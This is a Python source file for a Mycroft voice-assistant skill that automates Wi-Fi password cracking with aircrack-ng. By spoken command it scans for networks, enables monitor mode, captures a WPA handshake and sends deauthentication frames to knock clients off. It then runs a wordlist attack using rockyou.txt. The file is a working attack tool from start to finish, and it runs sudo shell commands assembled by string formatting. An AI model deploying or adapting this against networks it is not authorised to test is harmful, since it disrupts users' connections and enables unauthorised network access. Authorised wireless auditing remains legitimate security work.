from adapt.intent import IntentBuilder
from mycroft.skills.core import MycroftSkill, intent_handler
from mycroft.util.log import LOG
import subprocess, re, uuid, pexpect, tempfile
# https://github.com/JonStratton/skill-aircrack
# Just enough of a wrapper around some system commands to allow aircrack to crack wifi passwords. Basically
# 1. Choose an interface
# 2. Select a network
# 3. Monitor the network
# 4. Deauth the clients connected to the network (unless you can wait)
# 5. Crack password with wordlist

class AircrackSkill(MycroftSkill):

    # Deauths all connected clients to an interface. Some may reconnect so we can capture the auth.
    def deauth_clients( self, address, interface ):
        cmd = 'sudo aireplay-ng -0 1 -a %s %s' % ( address, interface )
        LOG.info( 'Executing: %s' % ( cmd ) )
        code = subprocess.call( cmd, shell=True, stdout=None, stderr=None )
        return code

    # Start dumping the network traffic
    def start_dump( self, interface, network):
        file_base = '%s/airodump_%s' % ( tempfile.gettempdir(), uuid.uuid4() )
        file_pcap = ''
        try:
           cmd = 'sudo airodump-ng %s --bssid %s --channel %s --output-format pcap --write %s -u 2' % ( interface, network.get( 'Address', '' ), network.get('Channel', ''), file_base )
           LOG.info( 'Executing: %s' % ( cmd ) )
           p = pexpect.spawn( cmd, timeout=10000 )
           p.expect( 'handshake' )
           p.sendcontrol('c');
           file_pcap = '%s-01.cap' % ( file_base )
        except: # Probably a timeout
           pass
        return file_pcap

    # Takes runs locate on a file to get the full path
    def get_wordlist_path( self, wordlist_file ):
        wordlist_path = ''
        cmd = 'locate %s' % wordlist_file
        LOG.info( 'Executing: %s' % ( cmd ) )
        p = subprocess.Popen( cmd, shell=True, stdout=subprocess.PIPE, stderr=subprocess.STDOUT )
        for line in p.stdout.readlines():
           wordlist_path = line.decode('utf-8').rstrip()
        return wordlist_path

    # After an auth has been captured, try to crack it with the worklist.
    def start_crack( self, cap_file, wordlist):
        password = ''
        cmd = 'aircrack-ng %s -w %s' % ( cap_file, wordlist )
        LOG.info( 'Executing: %s' % ( cmd ) )
        p = pexpect.spawn( cmd, timeout=10000 )
        try:
           # KEY FOUND! [ Password123 ]
           p.expect( '\[ .* \]' )
           password = p.after.decode('utf-8')
        except:
           pass
        return password

    # Bring up the interface in monitor mode.
    def start_interface( self, interface ):
        new_device = ''
        cmd = 'sudo airmon-ng start %s' % ( interface )
        LOG.info( 'Executing: %s' % ( cmd ) )
        p = pexpect.spawn( cmd, timeout=10000 )
        try:
           p.expect( 'mac80211 monitor mode vif enabled on \[.*\].*' )
           split_string = p.after.decode('utf-8').rstrip().split(']')
           new_device = split_string[1]
        except:
           pass
        return new_device

    # Stop monitoring interface
    def stop_interface( self, interface ):
        cmd = 'sudo airmon-ng stop %s' % ( interface )
        LOG.info( 'Executing: %s' % ( cmd ) )
        code = subprocess.call( cmd, shell=True, stdout=None, stderr=None )
        return code

    # List the connected network interfaces.
    def get_available_interfaces( self ):
        if_list = []
        cmd = 'sudo airmon-ng'
        LOG.info( 'Executing: %s' % ( cmd ) )
        p = subprocess.Popen( cmd, shell=True, stdout=subprocess.PIPE, stderr=subprocess.STDOUT )
        for line in p.stdout.readlines():
            split_line = re.split( r'\t+', line.decode('utf-8') )
            try:
               if split_line[1] != 'Interface':
                  if_list.append( split_line[1] )
            except IndexError:
               pass
        retval = p.wait
        return if_list

    # The conditional logic for below
    def check_network( self, network, match_regex ):
        is_match = False
        if network and network.get( 'ESSID', '' ):
           is_match = True
           essid    = network.get( 'ESSID', '' )
           if match_regex and not match_regex.search( essid ):
              is_match = False
        return is_match

    # Scan the interface for networks.
    def get_available_networks( self, interface, name_search ):
        net_list = []
        network  = {}
        essid_regex = re.compile( name_search, re.IGNORECASE)
        cmd = 'sudo iwlist %s scan' % ( interface )
        LOG.info( 'Executing: %s' % ( cmd ) )
        p = subprocess.Popen( cmd, shell=True, stdout=subprocess.PIPE, stderr=subprocess.STDOUT )
        for line in p.stdout.readlines():
           split_line = line.decode('utf-8').rstrip().split(':')
           key = split_line[0]
           value = re.sub(r'^"|"$', '', ':'.join( split_line[1:] ).strip() )
           if key.endswith('Address'): # New record found
              if self.check_network( network, essid_regex ): # Check and maybe save the old one
                 net_list.append( network )
              network = {} # Clear it out
              network['Address'] = value # Start the new one
           else:
              network[key.strip()] = value
        retval = p.wait
        if self.check_network( network, essid_regex ):
           net_list.append( network )
        return net_list

    # Takes are complicated network list, and returns a simple array of names.
    def get_essid_list( self, network_list ):
        essid_list = []
        for network in network_list:
            essid_list.append( network.get( 'ESSID', '' ) )
        return essid_list

    # Takes an array of strings, and returns a single string with numbers. So we can tts it.
    def list_to_string( self, list_to_string ):
        counted_list = []
        counter      = 0
        for item in list_to_string:
           counted_list.append( '%d: %s' % ( counter, item ) )
           counter = counter + 1
        return ', '.join( counted_list )

    def __init__(self):
        super(AircrackSkill, self).__init__(name="AircrackSkill")
        self.wordlist             = self.get_wordlist_path( 'rockyou.txt' ) # Or whatever
        self.available_interfaces = []
        self.monitor_interface    = ''
        self.available_networks   = []
        self.selected_network     = ''
        self.pcap_file            = ''

    def __del__(self):
        LOG.info( 'Goodbye world' )
        if self.monitor_interface:
            self.stop_interface( self.monitor_interface )
        if self.pcap_file:
            os.unlink(self.pcap_file)

    @intent_handler(IntentBuilder("ListInterface").require("List").require("Interface"))
    def handle_list_available_interfaces_intent(self, message):
        # refresh in case we forgot plug it in
        self.available_interfaces = self.get_available_interfaces()
        if len( self.available_interfaces ):
            self.speak_dialog("interfaces.are", data={'available_interfaces':self.list_to_string( self.available_interfaces )})
        else:
            self.speak_dialog("no.interfaces")

    @intent_handler(IntentBuilder("ListNetwork").require("List").require("Network").optionally("Named"))
    def handle_list_available_networks_intent(self, message):
        network_name = ''
        if message.data.get("Named"):
           network_name = str( message.data.get("Named") )
        LOG.info( 'Network Name: %s' % ( network_name ) )
        if self.settings.get('selected_interface') != 'None':
            self.available_networks = self.get_available_networks( self.settings.get('selected_interface'), network_name );
            if len( self.available_networks ):
                self.speak_dialog("networks.are", data={'available_networks':self.list_to_string( self.get_essid_list( self.available_networks ) )})
            else:
                self.speak_dialog("no.networks")
        else:
            self.speak_dialog("select.interface.first")

    # Select from a list of interfaces. If it looks like a monitor interface, set that too.
    @intent_handler(IntentBuilder("SelectInterface").require("Select").require("Interface").require("Number"))
    def handle_select_interface_intent(self, message):
        interface_number = 0
        try:
           interface_number = int( message.data.get("Number") )
        except:
           pass

        if interface_number <= len( self.available_interfaces ):
            self.settings['selected_interface'] = self.available_interfaces[interface_number]
            self.speak_dialog("selected.interface", data={'selected_interface':self.settings.get('selected_interface')})
        else:
            self.speak_dialog("no.such.interface")

    # Select from a list of networks
    @intent_handler(IntentBuilder("SelectNetwork").require("Select").require("Network").require("Number"))
    def handle_select_network_intent(self, message):
        network_number = 0
        try:
           network_number = int( message.data.get("Number") )
        except:
           pass
        if self.available_networks and network_number <= len( self.available_networks ):
            self.selected_network = self.available_networks[network_number]
            self.speak_dialog("selected.network", data={'selected_network':self.selected_network.get( 'ESSID', '' )})
        else:
            self.speak_dialog("no.such.network")

    # Start the interface in monitor mode, and start dumping until a handshake is captured.
    @intent_handler(IntentBuilder("StartMonitor").require("Start").require("Monitor"))
    def handle_start_monitor_intent(self, message):
        # Dont bother starting an interface we already started
        if not self.monitor_interface:
           self.monitor_interface = self.start_interface( self.settings.get('selected_interface') )
        self.speak_dialog("start.monitor")
        self.pcap_file = self.start_dump( self.monitor_interface, self.selected_network )
        if self.pcap_file:
           self.speak_dialog("captured.handshake")
        else:
           self.speak_dialog("monitor.stopped.early")

    # Stops the monitor interface. This should also stop any dumping going on
    @intent_handler(IntentBuilder("StopMonitor").require("Stop").require("Monitor"))
    def handle_stop_monitor_intent(self, message):
        self.stop_interface( self.monitor_interface )
        self.speak_dialog("stop.monitor")

    # Stops the monitor interface. This should also stop any dumping going on
    @intent_handler(IntentBuilder("DeauthClients").require("Deauth").require("Clients"))
    def handle_deauth_clients_intent(self, message):
        self.speak_dialog("deauthing.clients", data={'selected_network':self.selected_network.get( 'ESSID', '' )})
        self.deauth_clients( self.selected_network.get( 'Address', '' ), self.monitor_interface )

    # Stops the monitor interface. This should also stop any dumping going on
    @intent_handler(IntentBuilder("CrackPassword").require("Crack").require("Password"))
    def handle_crack_password_intent(self, message):
        password = self.start_crack( self.pcap_file, self.wordlist )
        if password:
           self.speak_dialog("recovered.password", data={'password':password})
        else:
           self.speak_dialog("no.password")

def create_skill():
    return AircrackSkill()
